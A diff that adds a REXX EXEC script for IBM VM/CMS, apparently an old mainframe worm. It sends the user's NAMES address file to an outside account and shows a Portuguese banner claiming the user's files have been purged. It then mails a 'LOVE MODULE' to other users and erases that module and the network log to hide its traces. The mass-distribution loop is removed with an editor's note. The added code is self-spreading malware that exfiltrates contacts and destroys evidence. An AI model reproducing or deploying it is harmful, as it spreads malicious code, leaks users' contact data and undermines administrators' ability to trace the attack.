@@ -1,0 +1,74 @@
+/**/
+'VMFCLEAR'
+XZ = userid()
+SF XZ NAMES TO 94112923 AT BRUFPB
+'VMFCLEAR'
+'VMFCLEAR'
+bri='1d69'x
+nri='1d70'x
+b='1de9'x
+c='1de3'x
+a=Diag(08,"SCREEN ALL REV")
+say bri center(xxxxxx,72) nri;
+a=Diag(08,"SCREEN ALL NON")
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri' PREZADO USUARIO TEMOS QUE LHE ENFORMAR QUE ESSE PROGRAMA
+'bri'###'nri
+say bri'###'nri' NA VERDADE E UMA VIROSE QUE TEM COMO FINALIDADE PURGAR
+'bri'###'nri
+say bri'###'nri' SEUS ARQUIVOS. APOS A SUA EXECUCAO NAO HA COMO DETE-LA
+'bri'###'nri
+say bri'###'nri' E PORTANTO NESSE MOMENTO EM QUE VOCE LE ESSA MENSAGEM,
+'bri'###'nri
+say bri'###'nri' NAO DEVE HAVER MAIS ARQUIVOS NA SUA CONTA...............
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri' OBRIGADO POR USAR A DESTRUTOR EXEC E LAMENTAMOS QUE TENHA
+'bri'###'nri
+say bri'###'nri' PERDIDO TODOS OS SEUS ARQUIVOS.
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri' Obs.: NAO HA COMO SABER QUEM E O AUTOR DA REFERIDA EXEC
+'bri'###'nri
+say bri'###'nri' UMA VEZ QUE ELA SE AUTO DESTROI APOS SUA CONCLUSAO
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+say bri'###'nri'
+'bri'###'nri
+a=Diag(08,"SCREEN ALL REV")
+say bri center(xxxxxx,72) nri;
+a=Diag(08,"SCREEN ALL NON")
+'ID (STACK'
+parse pull . . locnod
+'SET CMSTYPE HT'
+'STATE 'userid()' NAMES *'
+if rc=0 then do
+.
+.
+(Removed the part which distributes the file on all the users
+in the NAMES file. This is already known to administrators.)
+.
+.
+address CMS 'SENDFILE LOVE MODULE 'USERID' AT 'NODE' (NOLOG NOTYPE'
+.
+.
+'SET CMSTYPE RT'
+XZ = userid()
+ERASE LOVE MODULE
+ERASE XZ NETLOG A1
+exit
+
